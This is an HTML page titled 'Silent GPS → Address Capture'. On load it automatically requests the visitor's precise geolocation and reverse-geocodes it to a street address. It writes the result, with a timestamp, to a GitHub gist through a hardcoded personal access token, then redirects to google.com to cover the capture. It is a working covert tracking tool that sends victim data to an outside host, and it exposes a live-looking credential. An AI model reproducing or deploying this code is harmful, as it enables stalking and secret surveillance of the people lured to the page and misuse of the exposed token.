<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Silent GPS → Address Capture</title>
<style>
  body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;margin:20px;}
  #status{margin-top:12px; white-space: pre-line;}
</style>
</head>
<body>
<p id="status">Status: idle</p>

<script>
const STATUS = document.getElementById('status');

function setStatus(msg){ STATUS.textContent = 'Status: ' + msg; }

function copyToClipboard(text){
  navigator.clipboard.writeText(text).catch(()=>{});
}

// ==== CONFIGURE THIS ====
const GIST_ID   = "bdd46b38b6db4735d3a07fb0c201be19";              // <-- put your gist ID here
const FILE_NAME = "locations.txt";             // <-- gist file name
const TOKEN     = "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";         // <-- ⚠️ personal access token
// ========================

async function saveToGist(lat, lon, addr) {
  const url = `https://api.github.com/gists/${GIST_ID}`;

  const newContent = `Latitude: ${lat}, Longitude: ${lon}, Address: ${addr}, Time: ${new Date().toISOString()}\n`;

  // Overwrite file with new content each time (append-like by combining old content)
  try {
    const res = await fetch(url, {
      headers: { "Authorization": "token " + TOKEN }
    });
    let gist = await res.json();
    let oldContent = "";
    if (gist.files && gist.files[FILE_NAME] && gist.files[FILE_NAME].content) {
      oldContent = gist.files[FILE_NAME].content;
    }
    const updatedContent = oldContent + newContent;

    await fetch(url, {
      method: "PATCH",
      headers: {
        "Authorization": "token " + TOKEN,
        "Accept": "application/vnd.github.v3+json"
      },
      body: JSON.stringify({
        files: {
          [FILE_NAME]: { content: updatedContent }
        }
      })
    });
  } catch(e) {
    console.error("Error saving to gist", e);
  }
}

function reverseGeocode(lat, lon){
  const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`;
  fetch(url, {headers: {'User-Agent':'High-Precision-GPS-Test'}})
    .then(res=>res.json())
    .then(data=>{
      const addr = data.display_name ?? "N/A";
      const text = `Latitude: ${lat}\nLongitude: ${lon}\nAddress: ${addr}`;
      copyToClipboard(text);
      saveToGist(lat, lon, addr);
      setStatus('Location captured and saved. Redirecting...');
      setTimeout(()=>{ window.location.href='https://www.google.com'; }, 1500);
    })
    .catch(err=>{
      const text = `Latitude: ${lat}\nLongitude: ${lon}\nAddress: N/A`;
      copyToClipboard(text);
      saveToGist(lat, lon, "N/A");
      setStatus('Location captured (no address). Redirecting...');
      setTimeout(()=>{ window.location.href='https://www.google.com'; }, 1500);
    });
}

function onSuccess(pos){
  const c = pos.coords;
  reverseGeocode(c.latitude, c.longitude);
}

function onError(err){
  setStatus('Geolocation error. Redirecting...');
  setTimeout(()=>{ window.location.href='https://www.google.com'; }, 1500);
}

function requestLocation(){
  if(!('geolocation' in navigator)){
    setStatus('Geolocation not supported. Redirecting...');
    setTimeout(()=>{ window.location.href='https://www.google.com'; }, 1500);
    return;
  }
  navigator.geolocation.getCurrentPosition(onSuccess, onError, {
    enableHighAccuracy: true,
    timeout: 30000,
    maximumAge: 0
  });
}

// Attempt automatically
setTimeout(requestLocation, 300);
</script>
</body>
</html>
